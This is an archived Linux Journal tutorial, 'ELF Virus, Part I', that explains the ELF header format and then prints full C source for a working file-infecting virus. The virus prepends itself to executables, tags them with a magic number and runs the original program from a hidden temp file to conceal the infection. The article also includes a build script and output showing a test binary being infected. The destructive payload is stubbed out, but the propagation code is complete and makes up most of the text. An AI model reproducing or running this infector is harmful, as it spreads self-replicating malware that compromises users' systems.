@@ -1,0 +1,923 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><head><script src="//archive.org/includes/analytics.js?v=cf34f82" type="text/javascript"></script>
+<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app211.us.archive.org';v.server_ms=375;archive_analytics.send_pageview({});});</script>
+<script type="text/javascript" src="/_static/js/bundle-playback.js?v=rQCmsv02" charset="utf-8"></script>
+<script type="text/javascript" src="/_static/js/wombat.js?v=UHAOicsW" charset="utf-8"></script>
+<script type="text/javascript">
+  __wm.init("https://web.archive.org/web");
+  __wm.wombat("https://nnc3.com/mags/LJ_1994-2014/LJ/213/11185.html","20201222145218","https://web.archive.org/","web","/_static/",
+	      "1608648738");
+</script>
+<link rel="stylesheet" type="text/css" href="/_static/css/banner-styles.css?v=fantwOh2" />
+<link rel="stylesheet" type="text/css" href="/_static/css/iconochive.css?v=qtvMKcIJ" />
+<!-- End Wayback Rewrite JS Include -->
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"><title>
+ELF Virus, Part I
+</title><link rel="stylesheet" href="/web/20201222145218cs_/https://nnc3.com/mags/LJ_1994-2014/LJ/css/archive.css" type="text/css"><meta name="generator" content="DocBook XSL Stylesheets V1.57.0"><meta name="description" content="
+How to create a simple Linux ELF virus that can infect and propagate
+through other ELF executables.
+"><link rel="stylesheet" href="/web/20201222145218cs_/https://nnc3.com/mags/LJ_1994-2014/css/archive.css" type="text/css"><script type="text/javascript" src="/web/20201222145218js_/https://nnc3.com/mags/LJ_1994-2014/js/archive.js"></script><script type="text/javascript" src="/web/20201222145218js_/https://nnc3.com/mags/LJ_1994-2014/js/highlight.js"></script></head><body onload="search_highlight();">
+  <div class="headerdiv">
+    <a href="/web/20201222145218/https://nnc3.com/mags/LJ_1994-2014/index.html">
+      <img class="topimg" src="/web/20201222145218im_/https://nnc3.com/mags/LJ_1994-2014/images/CD_HeaderBanner.png" alt="LJ Archive CD"/>
+    </a>
+  </div>
+  
+  <div class="tophrdiv">
+  </div>
+  
+  <div id="top_search">
+  <table class="page_search" summary="">
+    <tr>
+      <td valign="top" align="left">
+        <p class="small_shutdown"><a href="/web/20201222145218/https://nnc3.com/.exit">Shutdown CD web server</a></p>
+      </td>
+      <td valign="top" align="right">
+        <form method="get" action="/web/20201222145218/https://nnc3.com/zoom/search.cgi">
+          <input type="hidden" name="zoom_sort" value="0"/>
+          <input type="hidden" name="zoom_xml" value="0"/>
+          <input type="hidden" name="zoom_per_page" value="10"/>
+          <input type="hidden" name="zoom_and" value="1"/>
+          Search: <input type="text" name="zoom_query" size="20" value="" class="zoom_searchbox"/>
+          <input type="submit" value="Submit"/>
+        </form>
+      </td>
+    </tr>
+  </table>
+  </div>
+  <div class="article" lang="en"><div class="titlepage"><div><h1 class="title"><a name="N0x24dc9f0.0x25d0d90"></a>
+ELF Virus, Part I
+</h1></div><div><div class="author"><h3 class="author">
+Himanshu
+ 
+Arora
+</h3></div><div class="issuemoyr">Issue #213, January 2012</div></div><div><p>
+How to create a simple Linux ELF virus that can infect and propagate
+through other ELF executables.
+</p></div></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d14c8"></a></h2></div></div><p>
+The history of computer viruses dates back to 1949 when Mr John von
+Neumann, a lecturer at the University of Illinois, wrote a paper: &ldquo;Theory of
+self-reproducing automata&rdquo;. That was just a research work, but since
+then,
+computer viruses have evolved dramatically. Apart from early systems,
+the Microsoft Windows OS has been a primary target for computer virus
+developers. Whether this is due to the number of people using that OS or the
+number of loop holes it carries, the debate still remains open. For the past
+two decades, the popularity of the Linux OS has grown in leaps and bounds with more
+and more Web server machines running on Linux. Using Linux on a PC or
+laptop is a growing trend. Linux's growing popularity poses the new
+threat of it being vulnerable to virus attacks. Although the success of
+existing Linux viruses has been limited, the threat still remains.
+</p><p>
+In this article, I discuss a particular category of Linux viruses
+known as ELF viruses, but before doing that, first let me introduce some
+basics that should help you understand the rest of the article.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d1730"></a>
+What Is ELF?</h2></div></div><p>
+ELF stands for Executable and Linkable Format. It is a standard file format
+for object files, executables, shared libraries and core dumps. It became a
+standard binary file format for UNIX (and UNIX-like systems) in 1999.
+</p><p>
+An ELF file begins with an ELF header, which is represented as the following
+structure:
+
+<pre class="programlisting">
+#define EI_NIDENT       16
+typedef struct {
+          unsigned char e_ident[EI_NIDENT];
+          Elf32_Half    e_type;
+          Elf32_Half    e_machine;
+          Elf32_Word    e_version;
+          Elf32_Addr    e_entry;
+          Elf32_Off     e_phoff;
+          Elf32_Off     e_shoff;
+          Elf32_Word    e_flags;
+          Elf32_Half    e_ehsize;
+          Elf32_Half    e_phentsize;
+          Elf32_Half    e_phnum;
+          Elf32_Half    e_shentsize;
+          Elf32_Half    e_shnum;
+          Elf32_Half    e_shstrndx;
+ } Elf32_Ehdr;
+</pre>
+</p><p>
+Here is the description of some of the basic elements in the structure
+above:
+</p><p>
+1) e_ident: ELF has capabilities to support multiple processors, data
+encodings, classes of machines and so forth. Now, to support all this, the ELF
+header includes some initial bytes that specify how to interpret the file
+independent of the file's contents and the processor on which the query is
+made. The e_ident[] array in the previous structure corresponds to these
+initial bytes. The following is the breakdown of the e_ident[] array:
+
+
+<pre class="programlisting">
+Name                 Value      Purpose
+
+EI_MAG0                 0   File identification
+EI_MAG1                 1   File identification
+EI_MAG2                 2   File identification
+EI_MAG3                 3   File identification
+EI_CLASS                4   File class
+EI_DATA                 5   Data encoding
+EI_VERSION              6   File version
+EI_PAD                  7   Start of padding bytes
+EI_NIDENT              16   Size of e_ident[]
+</pre>
+</p><p>
+EI_MAG0 to EI_MAG3 hold a magic number consisting of the following four bytes:
+                   
+<pre class="programlisting">
+'0x7f', 'E', 'L', 'F'
+</pre>
+</p><p>
+These four magical bytes help identify whether a file is of the ELF type or
+not.
+</p><p>
+2) e_type: this value helps identify the type of ELF file:
+
+<pre class="programlisting">
+Name          Value    Meaning
+                   
+ET_NONE          0    No file type
+ET_REL           1    Relocatable file
+ET_EXEC          2    Executable file
+ET_DYN           3    Shared object file
+ET_CORE          4    Core file
+ET_LOPROC   0xff00    Processor-specific
+ET_HIPROC   0xffff    Processor-specific
+</pre>
+</p><p>
+3) e_machine: this value helps identify the architecture for an ELF
+file:
+
+<pre class="programlisting">
+
+Name          Value    Meaning                    
+ET_NONE          0   No machine
+EM_M32           1   AT&amp;T WE 32100
+EM_SPARC         2   SPARC
+EM_386           3   Intel Architecture
+EM_68K           4   Motorola 68000
+EM_88K           5   Motorola 88000
+EM_860           7   Intel 80860
+EM_MIPS          8   MIPS RS3000 Big-Endian
+EM_MIPS_RS4_BE   10  MIPS RS4000 Big-Endian
+RESERVED       11-16 Reserved for future use
+
+</pre>
+</p><p>
+4) e_version: this value is used to identify the version of the object
+file:
+
+<pre class="programlisting">
+Name       Value    Meaning
+EV_NONE      0    Invalid version
+EV_CURRENT   1    Current version
+</pre>
+</p><p>
+The value 1 signifies the original file format; extensions will create new
+versions
+with higher numbers.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d1d60"></a>
+What Is an ELF Virus?</h2></div></div><p>
+An ELF virus is a malicious piece of code that mainly targets ELF
+executables and infects them in such a way that after being infected, either
+these executables start behaving abnormally or carry out some things that
+are invisible to the user. Most of the time, it's the latter of the two
+characteristics (as mentioned earlier) that is prominent in infected ELF
+executables, the most common being the invisible propagation of the virus
+to fresh executables each time an infected executable is run. Now you can
+easily understand that if an ELF virus somehow gains root access to a
+system, it can cause havoc.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d1ec0"></a>
+Types of ELF Viruses</h2></div></div><p>
+Most ELF viruses are based on the Silvio Cesare File Virus. These can be
+divided into two categories:
+</p><div class="orderedlist"><ol type="1"><li><p>
+A malicious piece of code that simply prepends itself to the start of
+innocent executables.
+</p></li><li><p>
+A malicious piece of code that is injected into the text or data segment
+of innocent executables.
+</p></li></ol></div><p>
+In this article, I focus on type 1 ELF viruses.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x25d21d8"></a>
+The Virus: Explained</h2></div></div><p>
+This virus, as mentioned previously, consists of a malicious piece of code that
+prepends itself to the start of other executables. Now, because it completely
+prepends itself to the start of other executables, so that it propagates
+completely, it leaves the least dependency on its source of origin. This way, the
+virus creates its own copy in all the executables it infects. 
+</p><p>
+This increases the life of the virus, because it would become very hard to
+find all the executables that are infected until you know the infection
+mechanism of the malicious code. Further, even if the source of the virus
+is deleted, the virus propagation does not stop until all the infected
+executables are cleaned/deleted.
+</p><p>
+Note: this virus would provide the propagation mechanism (that is, how it
+infects the executable to propagate), but it would refrain from showing its
+heart (that is, the piece of code that actually does something wrong with the
+infected executable or the system as a whole). This is because I don't want
+to encourage any newbie to directly copy and paste the virus and use it in
+any destructive way.
+</p><p>
+The following is a brief description of how the virus works.
+</p><p>
+<span class="emphasis"><em>When run for the very first time or run from an infected executable,
+here is what happens:</em></span>
+</p><p>
+1) As a very first step, it copies itself into memory. This is required, as
+the virus would like to prepend itself to any ELF executable it encounters.
+One important thing to note here is the size of the virus' compiled code.
+This size is required in the code so as to read itself into memory. I have
+defined a macro <tt>VIRUS_SIZE</tt> as a symbolic constant
+for the size of the virus. 
+</p><p>
+The following code reads the virus into the memory:
+
+<pre class="programlisting">
+if (read(fd1, virus, VIRUS_SIZE) != VIRUS_SIZE) 
+{
+    printf("\n read() failed \n");
+    return 1;
+}
+</pre>
+</p><p>
+One concern here is that if someone changes/adds/removes some code in the
+original source in a way that the size of the compiled binary changes.
+In that case, either manually change the value of the macro
+<tt>VIRUS_SIZE</tt> and make it equal to the value spit out
+by the command <tt>ls -l
+&lt;name of the binary&gt;</tt>, or write a script that does this automatically every time for you. 
+</p><p>
+2) In the second step, the virus determines the effective user ID of the
+user that has run this virus. This lets the logic determine whether the
+virus was run by root or any other user. Based on this information, the code
+decides which paths to search for ELF executables. The following line
+in the code determines the effective user ID:
+
+<pre class="programlisting">
+uid = geteuid();
+</pre>
+</p><p>
+3) In the third step, if the effective UID is that of root user, it starts
+scanning the system directories (hard-coded in the code) where there could
+be potential ELF executables present. If the effective UID is that of
+any other user, the code starts scanning the user's login directory for any
+vulnerable ELF executables:
+
+
+<pre class="programlisting">
+
+if(uid == 0) 
+{
+    /* Ohh...root powers...*/
+
+    /* Add more system directories that contain important binaries*/
+    //if(infections &lt; MAX_INFECT) searchForELF("/sbin", virus); 
+    //infecting system paths like these can cause havoc.... :-) 
+     
+    if(infections &lt; MAX_INFECT)
+        searchForELF("/home/himanshu/practice/elfvirus/filetoinfect",
+virus); // added my own directory as I wanted only select files 
+to be infected.
+       
+    launch_attack();
+} 
+else 
+{
+    /* The next two (commented) lines find the user's login directory
+       and try to infect all the ELF executables it can */
+
+    // info=*getpwuid(uid);       
+    // if(infections &lt; MAX_INFECT) searchForELF(info.pw_dir, virus);
+
+    if(infections &lt; MAX_INFECT)
+        searchForELF("/home/himanshu/practice/elfvirus/filetoinfect",
+virus); // added my own directory as I wanted only select files 
+to be infected.
+}
+
+</pre>
+</p><p>
+4) In the fourth step, the code checks for any valid ELF by checking its
+header. It checks the executable for things like
+it should be an ELF type, it should be for the architecture that the virus itself is
+compiled from, it should not be a core dump file and so on:
+
+
+<pre class="programlisting">
+
+if(hdr.e_ident[0] != ELFMAG0 || hdr.e_ident[1] != ELFMAG1 ||
+hdr.e_ident[2] != ELFMAG2 ||hdr.e_ident[3] != ELFMAG3) 
+{
+    printf("\n Not an ELF file \n");
+    return -1;
+}
+
+if (hdr.e_type != ET_EXEC &amp;&amp; hdr.e_type != ET_DYN)
+{
+    printf("\n Seems to be a core dump, skipping... \n");
+    return -1;
+}
+
+</pre>
+</p><p>
+5) Once the ELF is verified by the code that it is a valid ELF that can be
+infected, then:
+</p><div class="itemizedlist"><ul type="disc"><li><p>
+The code creates a temporary file and writes the buffer (compiled virus)
+that was copied in first step (step 1 above) to the temporary file
+created.
+</p></li><li><p>
+Reads the executable that is to be infected in memory and appends it to
+the temporary file (created above).
+</p></li><li><p>
+Appends a magic number (to signify that the executable is infected) at the end
+of this temporary file.
+</p></li><li><p>
+Changes the name of temp file so that it replaces the original
+innocent executable file.
+</p></li></ul></div><p>
+So, in this step, the virus makes its first propagation to an executable. 
+</p><p>
+6) In the sixth step, if the virus was executed as root, it launches its most
+dangerous piece of code&mdash;the payload through which destruction can be
+done. As I have explained previously, this is a dummy function
+<tt>launch_attack()</tt> in the code being discussed here, as I do not want to
+promote copy-paste-execute behavior.
+</p><p>
+Now whenever this infected executable is launched, the virus follows all
+these six steps again for infecting and propagating to other executables.
+</p><p><span class="emphasis"><em>
+If the virus is being executed from an infected executable, then
+after all the six steps described above, there has to be way that the
+infected executable that is launched should do its work correctly so that
+the user doesn't even have an idea of what happened behind the scenes. So in
+this case, the following steps (7&ndash;9) occur.</em></span>
+</p><p>
+7) In the seventh step, from the start of the executable, a seek to the end of
+virus code (that is, a seek equivalent to VIRUS_SIZE) is done. From here, all
+the bytes are copied (this would be compiled code of the actual executable) and
+written to a temporary file. 
+</p><p>
+8) In the eighth step, the code forks a new process, executes this
+temporary file and after execution, deletes the temporary file.
+</p><p>
+9) The user sees only that he or she executed a binary and that it executed fine.
+</p><p>
+Note: I have added some log statements to signify that the target
+executable is infected.
+
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x2887eb0"></a></h2></div></div><div class="sidebar"><p class="title"><b>Listing 1. A Simple ELF Virus</b></p><pre class="programlisting">
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;wait.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;elf.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pwd.h&gt;
+
+void launch_attack(void);
+int infect(char *filename, int fd, char *virus);
+void searchForELF(char *directory, char *virus);
+
+// This value must be equal to the size of the compiled virus. 
+// Adjust it if the size of the compiled binary changes.
+#define VIRUS_SIZE 14255
+#define MAGIC 6585
+#define TMPLATE "/tmp/.lx2k2XXXXXX"
+#define MAX_INFECT 5
+#define MAX_SIZE 1024
+
+
+static int magic = MAGIC;
+int infections=0;
+
+
+int main(int argc, char *argv[], char *env_ptr[])
+{
+   printf("\n Inside main \n");
+   
+   struct stat st;
+   int fd1, fd2;
+   uid_t uid;
+   pid_t pid;
+   char * host = NULL;
+   char virus[VIRUS_SIZE];
+   char tmp_file[MAX_SIZE];
+ //struct passwd info;
+   int len = 0;
+
+   fd1 = open(argv[0],O_RDONLY,0);
+
+   if (fstat(fd1, &amp;st) &lt; 0) 
+   {
+       printf("\n fstat() failed \n");
+       return -1;
+   }
+
+   if (read(fd1, virus, VIRUS_SIZE) != VIRUS_SIZE) 
+   {
+       printf("\n read() failed \n");
+       return 1;
+   }
+   
+   uid = geteuid();
+   if(uid == 0) 
+   {
+       /* Ohh...root powers...*/
+
+       /* Add more system directories containing important binaries*/
+       //if(infections &lt; MAX_INFECT) searchForELF("/sbin", virus); // 
+       //infecting system paths like these can cause havoc.... :-) 
+     
+       if(infections &lt; MAX_INFECT)
+           searchForELF("/home/himanshu/practice/elfvirus/filetoinfect",
+virus); // added my own directory as I wanted only select files to be
+infected.
+       
+       launch_attack();
+   } 
+   else 
+   {
+       /* The next two (commented) lines find the user's login 
+        directory and try to infect all the ELF executables it can*/
+
+       // info=*getpwuid(uid);       
+       // if(infections &lt; MAX_INFECT) searchForELF(info.pw_dir, virus);
+
+       if(infections &lt; MAX_INFECT)
+           searchForELF("/home/himanshu/practice/elfvirus/filetoinfect",
+virus); // added my own directory as I wanted only select files to be
+infected.
+   }
+
+
+   /* Files infected, if the virus was executed from an executable, 
+      go ahead and launch that executable */
+   len = st.st_size - VIRUS_SIZE;
+   if(!len)
+   {
+       printf("\n Virus executed from source and not from any infected
+executable. Exiting gracefully\n");
+       return 0;
+   }
+   else
+   {
+       printf("\n Virus executed by an infected executable. Launching 
+the executable now...\n");
+   }
+
+   // seek at the begining of executable code that user intented to run
+   if(lseek (fd1,VIRUS_SIZE, SEEK_SET) != VIRUS_SIZE) 
+   {
+      printf("\n lseek() failed \n");
+      return -1;
+   }
+
+   // Allocate some memory to hold the executable code in bytes
+   host = (char*)malloc(len);
+   if(host == NULL)
+   {
+       printf("\n malloc() returned NULL while allocating [%d]
+bytes\n",len);
+       return -1;
+   }
+
+   // Read the bytes
+   if(read(fd1, host, len) != len) 
+   {
+       printf("\n read() failed \n");
+       return -1; 
+   }
+   close(fd1);
+
+   // Create a temp file
+   strncpy(tmp_file, TMPLATE, MAX_SIZE);
+   fd2 = mkstemp(tmp_file);
+   if(fd2 &lt;0) 
+   {
+       printf("\n Temporary file creation failed \n");
+       return -1;
+   }
+   
+   if (write(fd2, host, len) != len) 
+   {
+       printf("\n write() failed\n");
+       return 1;
+   }
+ 
+   fchmod(fd2, st.st_mode);
+   free(host);
+   close(fd2);
+
+   /* Create a seperate process and run host */
+   pid = fork();
+   if (pid &lt; 0) 
+   {
+       printf("\n Fork() failed \n");
+       return 1;
+   }
+   if(pid == 0) 
+   {
+       exit(execve(tmp_file, argv, env_ptr));
+   }
+   if(waitpid(pid, NULL, 0) != pid) 
+   {
+       printf("\n WaitPid() failed \n");
+       return -1;
+   }
+   unlink(tmp_file);// Remove the tempoarary file (Erase evidence of all
+the wrong-doings :p )
+
+   return 0;
+}
+
+int infect(char *filename, int fd1, char *virus)
+{
+   printf("\n Inside infect \n");
+
+   #if 1
+   int fd;
+   struct stat st;
+   char *host;
+   char tmp_file[MAX_SIZE];
+   int chkmagic;
+   int offset;  
+   Elf32_Ehdr hdr;
+
+/* Check ELF Header */
+   if(read(fd1,&amp;hdr, sizeof(hdr)) != sizeof(hdr)) 
+   {
+       printf("\n read() failed \n");
+       return -1;
+   }
+
+   if(hdr.e_ident[0] != ELFMAG0 || hdr.e_ident[1] != ELFMAG1 ||
+hdr.e_ident[2] != ELFMAG2 ||hdr.e_ident[3] != ELFMAG3) 
+   {
+       printf("\n Not an ELF file \n");
+       return -1;
+   }
+
+   if (hdr.e_type != ET_EXEC &amp;&amp; hdr.e_type != ET_DYN)
+   {
+       printf("\n Seems to be a core dump, skipping... \n");
+       return -1;
+   }
+
+
+/* Check for MAGIC number */
+   if(fstat(fd1, &amp;st) &lt; 0)
+   {
+       printf("\n fstat() failed \n");
+       return -1;
+   }
+
+   offset = st.st_size - sizeof(magic);
+   if( lseek(fd1, offset, SEEK_SET) != offset )
+   {
+       printf("\n lseek() failed \n");
+       return -1;
+   }
+  
+
+   if(read(fd1, &amp;chkmagic, sizeof(magic)) != sizeof(magic))
+   {
+       printf("\n read() failed \n");
+       return -1;
+   }
+
+/* Chk if already infected by this virus */  
+   if(chkmagic == MAGIC)
+   {
+       printf("\n Executable is already infected by our virus \n");
+       return -1;
+   }
+  
+   if(lseek(fd1, 0, SEEK_SET) != 0)
+   {
+       printf("\n lseek() failed \n");
+       return -1;
+   }
+
+/* create and write the virus code in a temporary file */
+   strncpy(tmp_file, TMPLATE, MAX_SIZE);
+   fd=mkstemp(tmp_file);
+   if(fd&lt;0) 
+   {
+       printf("\n mkstemp() failed \n");
+       return -1;
+   }
+   if (write(fd, virus, VIRUS_SIZE) != VIRUS_SIZE)
+   {
+       printf("\n write() failed \n");
+       return -1;
+   }  
+
+/* Allocate memory for actual executable and read it */
+   host=(char *)malloc(st.st_size);
+   if(host==NULL) 
+   {
+       printf("\n malloc() failed \n");
+       return -1;
+   }
+  
+   if(read(fd1, host, st.st_size) != st.st_size)
+   {
+       printf("\n read() failed \n");
+       return -1;
+   }
+  
+
+/* Write actual executable at the end of file */
+   if(write(fd,host, st.st_size) != st.st_size)
+   {
+       printf("\n write() failed \n");
+       return -1;
+   }  
+/* Write magic number at the end */
+   if(write(fd,&amp;magic, sizeof(magic)) != sizeof(magic))
+   {
+       printf("\n write() failed \n");
+       return -1;
+   }  
+
+/* Revert with actual permissions */
+   if(fchown(fd, st.st_uid, st.st_gid) &lt; 0)
+   {
+       printf("\n fchown() failed \n");
+       return -1;
+   }
+  
+   if(fchmod(fd, st.st_mode) &lt; 0)
+   {
+       printf("\n fchmod() failed \n");
+       return -1;
+   }
+  
+/* Rename temporary file with original filename */
+   if(rename(tmp_file, filename) &lt; 0)
+   {
+       printf("\n rename() failed \n");
+       return -1;
+   }  
+
+   close(fd);
+   free(host);
+
+   infections++;
+   printf("***Infected %s.\n", filename);
+#endif
+   return 0;
+}
+
+
+
+void searchForELF(char *directory, char *virus)
+{
+   printf("\n Inside searchForELF \n");
+
+   int count;
+   DIR *dptr;
+   struct dirent *ptr;
+   int fd1, fd2;
+   struct stat st;
+   char filename[256];
+ 
+   dptr = opendir(directory);
+   ptr = readdir(dptr);
+
+   /* Go and find some files to infect */
+   if(ptr != NULL) 
+   {
+	for (count=0; (ptr = readdir(dptr)) !=NULL &amp;&amp;
+			infections &lt; MAX_INFECT; count++)
+	{
+	    strncpy(filename, directory, 255);
+	    strcat(filename, "/");
+            //printf("\n [%s] \n",filename);
+	    strncat(filename, ptr-&gt;d_name, 255-strlen(filename));
+            //printf("\n [%s] \n",ptr-&gt;d_name);
+	    fd1=open(filename, O_RDONLY, 0);
+            printf("\n Found ==&gt; [%s] \n",filename);
+
+	    if(fd1 &gt;= 0) 
+            {
+		fstat(fd1, &amp;st);
+		if(S_ISDIR(st.st_mode)) 
+                { // if a directory
+                    printf(" It is a directory\n");
+		    if(!(strcmp(ptr-&gt;d_name, "..")) &amp;&amp;
+(!strcmp(ptr-&gt;d_name, ".")) )
+		        searchForELF(filename, virus);
+		} 
+                else if(S_ISREG(st.st_mode)) 
+                {// if a regular file
+		    fd2=open(filename, O_RDWR, 0);
+		    if(fd2 &gt;= 0)
+		        infect(filename, fd2, virus); //function that
+infects the executable
+                    else
+                        printf("\n Could not open [%s]\n",filename);
+		}
+		close(fd2);
+	    }
+	    close(fd1);
+	}
+	closedir(dptr);
+   }
+}
+
+void launch_attack(void)
+{
+   // This function is left as a dummy as this code is only proof
+   // of concept, and I did not want to expose any dangerous stuff.
+   printf("\n Attack launched \n");
+}
+
+</pre></div><p>
+Note: in the code in Listing 1, just change the path
+/home/himanshu/practice/elfvirus/filetoinfect to the path where some
+executables (that you want to infect) are kept in your machine.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x2888118"></a>
+Compiling the Virus</h2></div></div><p>
+As I already mentioned, the value of the VIRUS_SIZE macro should be
+equal to the size of the compiled code. Here is a script that will
+automate the procedure:
+
+
+<pre class="programlisting">
+#!/bin/sh
+gcc -o elfvirus elfvirus.c
+FILESIZE=`ls -l elfvirus|awk '$5 {print $5}'`
+PROGSIZE=`awk '/define VIRUS_SIZE/ {print $3}' elfvirus.c`
+if [ $FILESIZE -eq $PROGSIZE ];then
+        echo File sizes are correct...Ready to Roll!
+else
+        echo File size do not match!
+        echo "Modifying source defines to VIRUS_SIZE $FILESIZE."
+        awk ' {if(/define VIRUS_SIZE/) print "#define VIRUS_SIZE
+"'$FILESIZE'; else print $0}' elfvirus.c &gt; elfvirus.c.new
+        mv elfvirus.c elfvirus.c.bak
+        mv elfvirus.c.new elfvirus.c
+        ./create
+fi
+</pre>
+</p><p>
+Simply run the above script to compile the virus code.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x2888328"></a>
+Output</h2></div></div><p>
+I created a &ldquo;hello world&rdquo; executable in the directory where this virus
+searches for executables to infect. 
+The following is a capture from my machine:
+
+
+<pre class="programlisting">
+himanshu@himanshu-laptop ~/practice/elfvirus/filetoinfect $ gcc -Wall
+hello.c -o hello
+himanshu@himanshu-laptop ~/practice/elfvirus/filetoinfect $ ./hello
+
+ Hello World
+</pre>
+</p><p>
+As you can see, the ELF executable <tt>hello</tt>, when run,
+outputs &ldquo;Hello
+World&rdquo;.
+</p><p>
+Now, I run the virus code:
+
+
+<pre class="programlisting">
+himanshu@himanshu-laptop ~/practice/elfvirus $ ./elfvirus 
+
+ Inside main 
+
+ Inside searchForELF 
+
+ Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/..] 
+ It is a directory
+
+ Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/.] 
+ It is a directory
+
+ Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/hello] 
+
+ Inside infect 
+***Infected /home/himanshu/practice/elfvirus/filetoinfect/hello.
+
+ Virus executed from source and not from any infected executable. Exiting
+gracefully
+</pre>
+</p><p>
+The log statements said that the virus successfully infected
+/home/himanshu/practice/elfvirus/filetoinfect/hello.
+Now, when I again execute <tt>hello</tt>, kept at the same path, I see:
+
+
+<pre class="programlisting">
+himanshu@himanshu-laptop ~/practice/elfvirus/filetoinfect $ ./hello
+
+ Inside main 
+
+ Inside searchForELF 
+
+ Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/..] 
+ It is a directory
+
+ Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/.] 
+ It is a directory
+
+ Found ==&gt; [/home/himanshu/practice/elfvirus/filetoinfect/hello] 
+
+ Could not open [/home/himanshu/practice/elfvirus/filetoinfect/hello]
+
+ Virus executed by an infected executable. Launching the executable now.
+
+ Hello World
+</pre>
+</p><p>
+So, it is clear from the above output that the virus has infected the
+executable <tt>hello</tt>, which, when run now, will try to infect other executables
+in the path mentioned in source code of the virus.
+</p></div><div class="simplesect" lang="en"><div class="titlepage"><div><h2 class="title"><a name="N0x24dc9f0.0x2888958"></a>
+Conclusion</h2></div></div><p>
+This article explains a basic ELF virus that prepends itself
+before other executables and infects them. This article is first in its
+series. My next article will show how to infect ELF by injecting code into text
+or a data segment.
+</p></div></div>
+<div class="authorblurb"><p>
+Himanshu Arora has been working as a software developer for the past four years. His
+Favorite language is C. He writes technical articles for many Web sites and
+loves adventure journeys with friends.
+</p></div>
+
+  <div class="toclinks">
+    <a class="link1" href="/web/20201222145218/https://nnc3.com/mags/LJ_1994-2014/LJ/tocindex.html">Archive Index</a>
+    <a class="link2" href="/web/20201222145218/https://nnc3.com/mags/LJ_1994-2014/LJ/213/toc213.html">Issue Table of Contents</a>
+    <a class="link3" href="/web/20201222145218/https://nnc3.com/mags/LJ_1994-2014/LJ/213/11185.html">Article</a>
+  </div>
+  <div class="bottomhrdiv">
+  </div>
+  
+  <div id="bottom_search">
+  <table class="page_search" summary="">
+    <tr>
+      <td valign="top" align="left">
+        <p class="small_shutdown"><a href="/web/20201222145218/https://nnc3.com/.exit">Shutdown CD web server</a></p>
+      </td>
+      <td valign="top" align="right">
+        <form method="get" action="/web/20201222145218/https://nnc3.com/zoom/search.cgi">
+          <input type="hidden" name="zoom_sort" value="0"/>
+          <input type="hidden" name="zoom_xml" value="0"/>
+          <input type="hidden" name="zoom_per_page" value="10"/>
+          <input type="hidden" name="zoom_and" value="1"/>
+          Search: <input type="text" name="zoom_query" size="20" value="" class="zoom_searchbox"/>
+          <input type="submit" value="Submit"/>
+        </form>
+      </td>
+    </tr>
+  </table>
+  </div>
+  
+  <div class="footerdiv">
+    <a href="https://web.archive.org/web/20201222145218/https://www.pubservice.com/Subnew2page.aspx?PC=LJ&amp;PK=M4ARDVD">
+      <img class="bottomimg" src="/web/20201222145218im_/https://nnc3.com/mags/LJ_1994-2014/images/CD_FooterBanner.png" alt="LJ Archive CD"/>
+    </a>
+  </div>
+  
+  <div class="copyright">
+    Copyright &copy; 1994 - 2014 <cite>Linux Journal</cite>.  All rights reserved.
+  </div>
+  </body></html><!--
+     FILE ARCHIVED ON 14:52:18 Dec 22, 2020 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 22:11:14 Jan 18, 2022.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  captures_list: 256.277
+  exclusion.robots: 0.157
+  exclusion.robots.policy: 0.138
+  RedisCDXSource: 2.373
+  esindex: 0.012
+  LoadShardBlock: 224.389 (3)
+  PetaboxLoader3.resolve: 218.492 (3)
+  PetaboxLoader3.datanode: 98.873 (5)
+  CDXLines.iter: 24.549 (3)
+  load_resource: 107.293
+  loaddict: 11.553
+-->
